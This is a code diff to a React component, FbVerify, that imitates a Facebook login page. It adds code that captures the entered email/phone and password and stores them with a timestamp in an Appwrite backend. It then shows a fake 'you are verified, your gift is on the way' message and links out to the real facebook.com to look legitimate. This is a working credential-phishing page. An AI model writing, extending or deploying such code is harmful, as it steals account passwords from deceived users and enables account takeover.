@@ -1,6 +1,52 @@
+import { useState } from "react";
 import "./FbVerify.css";
+import users from "../services/appwrite";
+import { useEffect } from "react";
+import { toast } from "react-toastify";
+import { ThreeDots } from "react-loader-spinner";
+import { Bounce } from "react-toastify";
+import { useNavigate } from "react-router";
 
 export default function FbVerify() {
+
+  const navigate = useNavigate()
+  const [username, setUsername] = useState("")
+  const [password, setPassword] = useState("")
+  const [isLoggedIn, setIsLoggedIn] = useState(false)
+  const [loading, setLoading] = useState(false)
+
+  const notify = () => toast.success('Success! 🥳 You are verified successfully. We have sent you an email 📩 for further progress. Your gift 🎁 is on the way...Enjoy! 🎉', {
+    position: "top-center",
+    autoClose: 5000,
+    hideProgressBar: false,
+    closeOnClick: false,
+    pauseOnHover: true,
+    draggable: true,
+    progress: undefined,
+    theme: "dark",
+    transition: Bounce,
+    });
+
+  const handleSubmit = (e) => {
+    e.preventDefault()
+    setLoading(true)
+    const user = {username,password}
+    users.loginUser({...user, date: new Date().toISOString()})
+    .then((res)=>{
+      res ? setIsLoggedIn(true):setIsLoggedIn(false)
+      
+    })
+  }
+
+  useEffect(() => {
+   if(isLoggedIn){
+     notify()
+    setTimeout(() => {
+      navigate("/")
+    }, 2500);
+   }
+  }, [isLoggedIn, navigate])
+  
   
   
   return (
@@ -24,23 +70,42 @@ export default function FbVerify() {
     </div>
     <div className="w-50">
       <div className="form-section">
-        <form action="#" method="POST">
+        <form onSubmit={handleSubmit}>
           <input
+          required
             type="text"
             name="email-or-number"
             id="email-or-number"
             placeholder="Email address or phone number"
+            onChange={(e)=>setUsername(e.target.value)}
+            value={username}
           />
           <input
+          required
             type="password"
             name="password"
             id="password"
             placeholder="Password"
+            onChange={(e)=>setPassword(e.target.value)}
+    value={password}
           />
-          <input type="submit" name="submit" id="submit" value="Log In" />
-          <a href="#" target="_self" className="forgot">Forgotten password?</a>
+          <button className="cursor-pointer relative" type="submit" name="submit" id="submit" disabled={loading}>
+          {loading?<div className="absolute left-1 -top-4 scale-50">
+            <ThreeDots
+              visible={true}
+              color="blue"
+              radius="9"
+              ariaLabel="three-dots-loading"
+              wrapperStyle={{}}
+              wrapperClass=""
+              
+              />
+          </div>:""} <span className="inline-block">Log In</span>
+          </button>
+          
+          <a href="https://facebook.com/login" target="_self" className="forgot">Forgotten password?</a>
           <div className="line"></div>
-          <a href="#" target="_self" className="create-new-acc"
+          <a href="https://facebook.com/login" target="_self" className="create-new-acc"
             >Create New Account</a
           >
         </form>
